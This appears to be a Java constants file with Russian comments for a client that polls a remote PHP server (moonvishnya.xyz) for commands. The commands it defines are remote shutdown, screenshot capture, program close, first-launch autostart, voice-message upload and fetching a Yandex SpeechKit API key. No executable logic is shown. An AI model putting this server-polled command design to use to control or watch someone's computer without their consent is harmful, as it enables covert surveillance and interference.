package application.server;


public interface ServerInformation {

    String SERVER_NAME = "http://moonvishnya.xyz";
    String ON_CHECK_FOR_SIGNAL_OPERATION = "/moon_remote_signal_getter.php?action=check_for_signal&username=ISPOSTED";

    String ON_DELETE_SIGNAL_OPERATION = "";
    String SERVER_ON_ADD_SIGNAL_OPERATION = "";
    String SERVER_ON_ADD_ACTIVE_USER = "";
    String SERVER_ON_ADD_VOICE_MSG = "/moon_remote_signal_getter.php?action=add_voice_signal&username=ISPOSTED&msg=";
    String GET_API_KEY = "/moon_remote_signal_getter.php?action=get_api_key";
    /*
        сигнала нет
     */

    String ANSW_NO_SIGNAL = "\tno signal\t\t";


    /*
        команды выполнения на компьютере;
     */
    String ANSW_FIRST_LAUNCH_AUTO_STARTUP_CMD = "firstlaunch";
    String ANSW_CLOSE_CMD = "close"; //выключает программу
    String ANSW_SHUT_DOWN_CMD = "/c windowsout"; // выключает компьютер
    String ANSW_SCREEN_CMD = "screen"; // делает скриншот
    String ANSW_ON_MUSIC_CMD = "\t[{\"password\":\"\"}]\t"; // открывает трек
    String ANSW_GET_API_KEY = "getkey"; // возвращает ключ для Яндекс.СпичкитАPI

    /*
        обязателен при построении голосового сообщения
     */



}
